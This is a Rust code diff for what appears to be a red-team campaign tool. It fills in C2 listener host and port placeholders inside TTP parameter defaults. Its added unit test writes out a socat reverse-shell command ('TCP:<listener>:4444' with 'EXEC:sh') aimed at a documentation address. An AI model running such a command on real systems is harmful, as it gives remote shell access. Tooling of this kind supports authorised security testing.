@@ -112,15 +112,23 @@ fn ground_listener_defaults(
 ) -> Result<(), ExecuteActionError> {
     let host_placeholder = "${LISTENER}";
     let port_placeholder = "${LISTENER_PORT}";
-    let host_needed = args.values().any(|value| value.trim() == host_placeholder)
-        || (ttp_references(ttp, host_placeholder)
+    let host_default_referenced = listener_default_references(ttp, args, host_placeholder);
+    let port_default_referenced = listener_default_references(ttp, args, port_placeholder);
+    let host_needed = (ttp_references(ttp, host_placeholder)
+        && listener_value_needs_default(args, "LISTENER", host_placeholder))
+        || (host_default_referenced
             && listener_value_needs_default(args, "LISTENER", host_placeholder));
-    let port_needed = args.values().any(|value| value.trim() == port_placeholder)
-        || (ttp_references(ttp, port_placeholder)
+    let port_needed = (ttp_references(ttp, port_placeholder)
+        && listener_value_needs_default(args, "LISTENER_PORT", port_placeholder))
+        || (port_default_referenced
             && listener_value_needs_default(args, "LISTENER_PORT", port_placeholder));
 
-    if !host_needed && !port_needed {
+    if !host_needed && !port_needed && !host_default_referenced && !port_default_referenced {
         return Ok(());
+    }
+
+    if !host_needed && !port_needed {
+        return ground_listener_tokens_in_declared_defaults(ttp, args);
     }
 
     let listener_params: Vec<_> = ttp
@@ -226,7 +234,76 @@ fn ground_listener_defaults(
         args.entry("LISTENER_PORT".to_string())
             .or_insert_with(|| listener.port.to_string());
     }
+    ground_listener_tokens_in_declared_defaults(ttp, args)
+}
+
+fn ground_listener_tokens_in_declared_defaults(
+    ttp: &Ttp,
+    args: &mut HashMap<String, String>,
+) -> Result<(), ExecuteActionError> {
+    for param in &ttp.params {
+        let is_declared_default = args
+            .get(&param.name)
+            .is_some_and(|value| value_matches_declared_default(param, value));
+        if is_declared_default && param.default.contains("${LISTENER") {
+            let value = args
+                .get(&param.name)
+                .expect("declared default was checked above")
+                .clone();
+            let grounded = ground_template(&value, args);
+            if grounded.contains("${LISTENER}") || grounded.contains("${LISTENER_PORT}") {
+                return Err(ExecuteActionError::InvalidInput(format!(
+                    "action '{}' has unresolved listener defaults in parameter '{}'; select a Listener or provide concrete LISTENER and LISTENER_PORT values",
+                    ttp.id, param.name
+                )));
+            }
+            args.insert(param.name.clone(), grounded);
+        }
+    }
     Ok(())
+}
+
+fn listener_default_references(
+    ttp: &Ttp,
+    args: &HashMap<String, String>,
+    placeholder: &str,
+) -> bool {
+    ttp.params.iter().any(|param| {
+        param.default.contains(placeholder)
+            && args
+                .get(&param.name)
+                .is_some_and(|value| value_matches_declared_default(param, value))
+            && ttp_references_param(ttp, &param.name)
+    })
+}
+
+/// A parameter can be interpolated either as `${NAME}` or as a Tera variable,
+/// including a filtered expression such as `{{ Arguments | json_encode }}`.
+fn ttp_references_param(ttp: &Ttp, name: &str) -> bool {
+    let dollar_placeholder = format!("${{{}}}", name);
+    let tera_with_space = format!("{{{{ {}", name);
+    let tera_without_space = format!("{{{{{}", name);
+    ttp.procedures.iter().any(|procedure| {
+        procedure.command.contains(&dollar_placeholder)
+            || procedure.command.contains(&tera_with_space)
+            || procedure.command.contains(&tera_without_space)
+    }) || ttp
+        .effects
+        .iter()
+        .any(|effect| effect.contains(&dollar_placeholder))
+}
+
+fn value_matches_declared_default(param: &armory::TtpParam, value: &str) -> bool {
+    if param.param_type != "stringList" {
+        return value == param.default;
+    }
+    matches!(
+        (
+            serde_json::from_str::<Vec<String>>(value),
+            serde_json::from_str::<Vec<String>>(&param.default),
+        ),
+        (Ok(value), Ok(default)) if value == default
+    )
 }
 
 fn listener_value_needs_default(
@@ -974,8 +1051,8 @@ impl Campaign {
                 args.insert(p.name.clone(), p.default.clone());
             }
         }
-        normalize_string_list_params(&ttp, &mut args)?;
         ground_listener_defaults(&ttp, &mut args, self)?;
+        normalize_string_list_params(&ttp, &mut args)?;
 
         // This action's semantic target is the selected Pod. Never allow
         // legacy Namespace/PodName arguments to redirect execution elsewhere.
@@ -3254,7 +3331,7 @@ mod listener_grounding_tests {
     use c2::BUILTIN_C2_ID;
     use ran_domain::{Entity, EntityId, HostsListener, Listener};
 
-    use super::{ground_listener_defaults, Campaign};
+    use super::{ground_listener_defaults, normalize_string_list_params, Campaign};
     use crate::campaign::ExecuteActionError;
     use crate::effects::ground_template;
     use crate::InitialKnowledge;
@@ -3373,6 +3450,53 @@ mod listener_grounding_tests {
             "listener/tcp/4444",
             "canonical IDs remain protocol/port based"
         );
+    }
+
+    #[test]
+    fn listener_tokens_in_json_string_list_defaults_are_grounded() {
+        let (campaign, listener) = campaign_with_listener(4444);
+        let mut ttp = listener_ttp();
+        ttp.params.extend([
+            TtpParam {
+                name: "LISTENER".to_string(),
+                param_type: "string".to_string(),
+                description: String::new(),
+                required: false,
+                default: "${LISTENER}".to_string(),
+            },
+            TtpParam {
+                name: "LISTENER_PORT".to_string(),
+                param_type: "int".to_string(),
+                description: String::new(),
+                required: false,
+                default: "${LISTENER_PORT}".to_string(),
+            },
+            TtpParam {
+                name: "Arguments".to_string(),
+                param_type: "stringList".to_string(),
+                description: String::new(),
+                required: false,
+                default: "[\"TCP:${LISTENER}:${LISTENER_PORT}\", \"EXEC:sh\"]".to_string(),
+            },
+        ]);
+        ttp.procedures[0].command = "socat {{ Arguments | json_encode }}".to_string();
+        let mut args = HashMap::from([
+            ("LISTENER_REF".to_string(), listener.entity_id().0),
+            ("LISTENER".to_string(), "${LISTENER}".to_string()),
+            ("LISTENER_PORT".to_string(), "${LISTENER_PORT}".to_string()),
+            (
+                "Arguments".to_string(),
+                "[\"TCP:${LISTENER}:${LISTENER_PORT}\",\"EXEC:sh\"]".to_string(),
+            ),
+        ]);
+
+        ground_listener_defaults(&ttp, &mut args, &campaign).unwrap();
+        normalize_string_list_params(&ttp, &mut args).unwrap();
+        let rendered = ground_template(&ttp.procedures[0].command, &args);
+
+        assert_eq!(args["Arguments"], "[\"TCP:192.0.2.44:4444\",\"EXEC:sh\"]");
+        assert!(!rendered.contains("${LISTENER}"));
+        assert!(!rendered.contains("${LISTENER_PORT}"));
     }
 }
 
